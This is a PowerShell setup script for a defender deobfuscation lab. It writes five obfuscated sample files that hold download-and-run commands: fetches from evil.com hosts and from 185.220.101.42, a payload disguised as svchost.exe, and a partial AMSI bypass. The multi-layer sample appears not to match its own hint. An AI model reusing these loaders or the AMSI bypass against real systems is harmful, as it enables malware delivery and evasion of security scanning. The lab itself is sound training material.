
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Setting up PowerShell Deobfuscation lab..."

New-Item -Path C:\LabData -ItemType Directory -Force | Out-Null
$logPath = "C:\LabData"

# Sample 1: Base64 encoded
$sample1 = @'
# Captured from compromised workstation - EventID 4688
# Process: powershell.exe
# CommandLine:
powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AcwBlAHIAdgBlAHIALgBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB1AHAAZABhAHQAZQByAC4AZQB4AGUAIgA=

# Hint: Decode with [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("..."))
'@
Set-Content -Path "$logPath\sample1_base64.ps1" -Value $sample1

# Sample 2: String concatenation
$sample2 = @'
# Captured obfuscated script
$a = "Ne" + "w-O" + "bje" + "ct"
$b = "Sys" + "tem." + "Net." + "Web" + "Cli" + "ent"
$c = "Dow" + "nlo" + "adF" + "ile"
$url = [char]104+[char]116+[char]116+[char]112+[char]58+[char]47+[char]47 -join ""
$url += "evil" + ".com" + "/trojan" + ".exe"
$dest = $env:TEMP + "\s" + "vc" + "host.exe"
# What does this execute?
# Deobfuscate by resolving each variable
'@
Set-Content -Path "$logPath\sample2_concat.ps1" -Value $sample2

# Sample 3: Multi-layer IEX
$sample3 = @'
# Three layers of encoding
# Layer 3 (outermost):
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJhV1YNQ2c9PSIpKQ=="))

# Hint: Decode from outside in. Each layer reveals another encoded string.
# Layer 3 decodes to Layer 2 decodes to Layer 1 decodes to final payload.
# a1dOQ2c9PQ== is the innermost base64
'@
Set-Content -Path "$logPath\sample3_multilayer.ps1" -Value $sample3

# Sample 4: AMSI bypass
$sample4 = @'
# Captured AMSI bypass attempt
$a = [Ref].Assembly.GetType("System.Management.Automation.Amsi" + "Utils")
$b = $a.GetField("amsi" + "InitFailed", "NonPublic,Static")
# What does setting this field to $true accomplish?
# Which .NET class/method is being targeted?
# Answer: AmsiUtils.amsiInitFailed
'@
Set-Content -Path "$logPath\sample4_amsi.ps1" -Value $sample4

# Sample 5: Complex obfuscation
$sample5 = @'
# Complex multi-technique obfuscation
$x = [char[]](73,69,88) -join ""  # IEX
$y = [System.Text.Encoding]::ASCII
$z = "aHR0cDovLzE4NS4yMjAuMTAxLjQyOjgwODAvYmVhY29u"
$url = $y.GetString([Convert]::FromBase64String($z))
$f = -join([char[]](36,99,61,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,59))
$f += -join([char[]](36,99,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39))
$f += $url
$f += -join([char[]](39,41))

# Deobfuscate completely. Find:
# 1. The download URL (decode $z from base64)
# 2. The PowerShell command (convert $f char codes to string)
# 3. All IOCs (IPs, URLs, file paths)
'@
Set-Content -Path "$logPath\sample5_complex.ps1" -Value $sample5

@"
=== PowerShell Deobfuscation for Defenders Lab ===

Files:
  sample1_base64.ps1      - Base64 encoded command
  sample2_concat.ps1      - String concatenation obfuscation
  sample3_multilayer.ps1  - Multi-layer IEX encoding (3 layers)
  sample4_amsi.ps1        - AMSI bypass technique
  sample5_complex.ps1     - Complex multi-technique obfuscation

Deobfuscation techniques:
  # Decode Base64 (Unicode/UTF-16LE)
  [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("encoded_string"))

  # Decode Base64 (ASCII/UTF-8)
  [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("encoded_string"))

  # Convert char codes to string
  [char[]](72,101,108,108,111) -join ""

  # Safely inspect without executing
  # Replace IEX/Invoke-Expression with Write-Output to see the payload

Your goal: Fully deobfuscate all 5 samples and extract IOCs.
"@ | Set-Content -Path "$logPath\README.txt"

Write-Host "[+] PowerShell Deobfuscation lab setup complete."
